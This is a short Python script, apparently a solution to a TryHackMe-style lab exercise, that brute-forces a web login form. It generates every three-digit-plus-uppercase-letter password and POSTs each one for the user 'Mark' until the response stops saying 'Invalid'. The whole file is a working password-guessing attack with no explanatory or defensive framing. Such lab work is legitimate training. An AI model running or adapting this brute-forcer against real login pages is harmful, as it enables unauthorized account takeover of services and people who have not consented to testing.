import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

password_list_numbers = [str(i).zfill(3) for i in range(1000)]
password_list_alphabetupper = [str(j) for j in string.ascii_uppercase]

def concat_passes():
	password_list=[]
	for i in password_list_numbers:
		for j in password_list_alphabetupper:
			password_list.append(str(i)+str(j))
	return(password_list)
costam = concat_passes()

def brute_force(password_list):
	for password in password_list:
		data = {"username": username, "password": password}
		response = requests.post(url, data=data)

		if "Invalid" not in response.text:
			print(f"[+] Found valid credentials: {username}:{password}")
			break
		else:
			print(f"[-] Attempted: {password}")

brute_force(costam)
